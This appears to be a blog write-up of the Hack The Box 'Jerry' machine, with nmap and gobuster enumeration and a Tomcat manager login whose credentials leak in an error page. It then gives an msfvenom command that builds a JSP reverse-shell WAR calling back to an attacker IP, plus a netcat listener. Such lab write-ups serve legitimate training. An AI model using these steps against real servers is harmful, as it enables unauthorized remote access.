---
title: "Jerry"
date: 2023-09-11T21:46:53+02:00
tags: ["windows","web"]
categories: ["hackthebox"]
author: "Ayman Boulaich"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "A friendly linux machine which has a only http port which is vulnerable to WAR files upload. PrivEsc for this machine is not needed."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Room Information

- Room name: Jerry
- Difficulty level: Easy
- Room link: https://app.hackthebox.com/machines/Jerry

![Untitled](/HTB/jerry-icon.png)

## Tools Used

- nmap
- msfvenom

## Port Scanning

```bash
sudo nmap $IP -n -Pn -vvv --min-rate 5000
```

```bash
PORT     STATE SERVICE REASON          VERSION
8080/tcp open  http    syn-ack ttl 127 Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache-Coyote/1.1
```

Only one http server in port 8080 running a website powered by Apache Tomcat.

## Enumeration

![Untitled](/HTB/jerry-1.png)

The website looks like a default Apache Tomcat website.

Let’s fuzz the page

```bash
gobuster dir -u http://$IP:8080/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -x php,html,css,js,py,txt -t 100 -o fuzz | tee fuzz.save
```

```bash
/aux                  (Status: 200) [Size: 0]
/com1                 (Status: 200) [Size: 0]
/com2                 (Status: 200) [Size: 0]
/com3                 (Status: 200) [Size: 0]
/con                  (Status: 200) [Size: 0]
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/favicon.ico          (Status: 200) [Size: 21630]
/host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
/tomcat.css           (Status: 200) [Size: 5931]
```

The manager directory called my attention, could be a potential admin page.

When I try to access to `/manager` directory a prompt with a login form is displayed so I decided to put default/common credentials.

But when I failed the first login attempt a server error is displayed but leaking the credentials

![Untitled](/HTB/jerry-2.png)

![Untitled](/HTB/jerry-3.png)

Once inside we can see a admin tool where we are able to upload WAR files.

## Exploiting

After investigating about WAR files, I found a blog talking about how to build a reverse shell for Tomcat servers.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.9 LPORT=4444 -f war -o shell.war
```

The above command builds a Java JSP reverse shell with war extension.

Now it’s time to upload and deploy the file.

![Untitled](/HTB/jerry-4.png)

A new directory is displayed now in the admin tool, let’s access to `/shell` but before we need to set a nc listener.

```bash
nc -lv 4444
```

## Gaining an Initial Foothold

![Untitled](/HTB/jerry-5.png)

**NT / AUTHORITY SYSTEM** without privEsc, I think it is the easiest machine so far.

## Flag(s)

![Untitled](/HTB/jerry-6.png)

![Untitled](/HTB/jerry-7.png)

